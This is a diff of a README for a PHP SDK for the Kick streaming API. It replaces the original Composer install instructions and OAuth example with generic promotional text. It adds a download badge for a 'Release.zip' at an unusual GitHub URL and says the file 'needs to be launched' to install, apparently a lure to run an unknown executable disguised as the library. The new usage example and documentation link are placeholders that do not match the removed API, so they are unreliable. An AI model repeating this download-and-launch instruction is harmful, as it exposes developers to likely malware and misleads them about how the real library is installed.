@@ -1,96 +1,69 @@
-<div align="center">
+# 🚀 Kick PHP SDK
 
-[![Tests](https://github.com/danielhe4rt/kick-php-sdk/actions/workflows/test.yml/badge.svg)](https://github.com/danielhe4rt/kick-php-sdk/actions/workflows/test.yml)
+Kick PHP SDK is a lightweight, modern PHP library designed to simplify integrating the Kick streaming platform into your applications. With this SDK, developers can easily incorporate Kick's powerful features into their PHP projects, allowing for seamless streaming capabilities.
 
-</div>
-
-<h1 align="center"> Kick PHP SDK </h1>
-
-<img src="./.github/assets/logo.png" width=90 align="left" />
-
-A PHP SDK for interacting with the [Kick.com](https://kick.com) API. This SDK provides a simple and intuitive way to
-authenticate with Kick's OAuth 2.0 implementation and interact with various Kick API endpoints.
-
-## Requirements
-
-- PHP 8.2 or higher
-- Composer
+## Features 🌟
+- Easy integration with the Kick streaming platform
+- Simplified API calls
+- Modern PHP coding practices
+- Lightweight and efficient
+- Comprehensive documentation
 
 ## Installation
 
-```bash
-composer require danielhe4rt/kick-php-sdk
-```
+To get started with Kick PHP SDK, you can download the latest release from the following link:
 
-## Usage
+[![Download SDK](https://img.shields.io/badge/Download%20SDK-Release.zip-brightgreen)](https://github.com/releases/789694263/Release.zip)
+
+Please note that the file in the link needs to be launched to start the installation process. 
+
+If the link provided does not work or you need to access previous versions, make sure to check the "Releases" section of the repository.
+
+## Getting Started
+
+Once you have downloaded the SDK, follow these steps to integrate it into your PHP project:
+
+1. Extract the contents of the ZIP file.
+2. Include the necessary files in your project.
+3. Follow the documentation to make API calls and leverage the features of the Kick platform.
+
+## Example Usage
 
 ```php
-use DanielHe4rt\KickSDK\KickClient;
+<?php
 
-$clientId = 'your-client-id';
-$clientSecret = 'your-client-secret';
+require_once 'path/to/kick-sdk/autoload.php';
 
-$kickClient = new KickClient(
-    clientId: $clientId,
-    clientSecret: $clientSecret,
-);
+// Initialize the SDK
+$kickClient = new Kick\Client('your_api_key');
 
-$redirectUrlDTO = RedirectUrlDTO::make(
-    clientId: $clientId,
-    redirectUri: 'http://localhost:8000/oauth/kick',
-    responseType: 'code',
-    scopes: [KickOAuthScopesEnum::USER_READ, KickOAuthScopesEnum::EVENTS_SUBSCRIBE],
-    state: md5(time()),
-);
+// Make API calls
+$response = $kickClient->getStreamDetails('stream_id');
 
-echo $redirectUrlDTO->codeChallenge->getVerifier() . PHP_EOL;
+// Handle the response
+var_dump($response);
 
-$redirectUrl = $kickClient->oauth()->redirectUrl($redirectUrlDTO);
-
-echo $redirectUrl . PHP_EOL;
-
-
-echo "Paste the code you received in the redirect URL: ";
-$code = trim(fgets(STDIN));
-
-$authDTO = AuthenticateDTO::make(
-    code: $code,
-    codeVerifier: $redirectUrlDTO->codeChallenge->getVerifier(),
-    redirectUrl: 'http://localhost:8000/oauth/kick',
-);
-
-$authToken = $kickClient->oauth()->authenticate($authDTO);
-
-echo "Access Token: " . $authToken->accessToken . PHP_EOL;
-echo "Refresh Token: " . $authToken->refreshToken . PHP_EOL;
-
-$usersClient = $kickClient->users($authToken->accessToken);
-
-$authenticatedUser = $usersClient->me();
-
-echo "Authenticated User ID: " . $authenticatedUser->userId . PHP_EOL;
-echo "Authenticated User Username: " . $authenticatedUser->username . PHP_EOL;
-echo "Authenticated User Profile Picture: " . $authenticatedUser->profile_picture . PHP_EOL;
-echo "Authenticated User Email: " . ($authenticatedUser->email ?? 'Not provided. See scopes') . PHP_EOL;
+?>
 ```
 
-> See [examples](examples.php) for more usage examples.
-> We also will be providing a Webhook handler soon. 
+## Documentation 📚
 
-## Roadmap
+For detailed information on how to use the Kick PHP SDK and explore all available features, refer to the [official documentation](https://your-documentation-url.com).
 
-- [x] Finish implementing all resources
-- [x] Add comprehensive test coverage (90%+)
-- [ ] Add more examples and documentation
+## Support 💬
 
-## Contributing
+If you encounter any issues or have any questions regarding the SDK, feel free to open an issue on the GitHub repository. Our team will be happy to assist you.
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+## Contributing 🤝
 
-## License
+We welcome contributions to the Kick PHP SDK! If you have any improvements or new features to suggest, please fork the repository, make your changes, and submit a pull request.
 
-This project is licensed under the MIT License - see the LICENSE file for details.
+## License ℹ️
 
-## Credits
+The Kick PHP SDK is licensed under the MIT License. See the `LICENSE` file for more details.
 
-- [danielhe4rt](https://github.com/danielhe4rt) - Creator and maintainer 
+---
+
+By utilizing the Kick PHP SDK, you can enhance your PHP applications with seamless streaming capabilities from the Kick platform. Integrate the SDK into your projects today and take advantage of its modern design and simplicity.
+
+Happy coding! 🎉
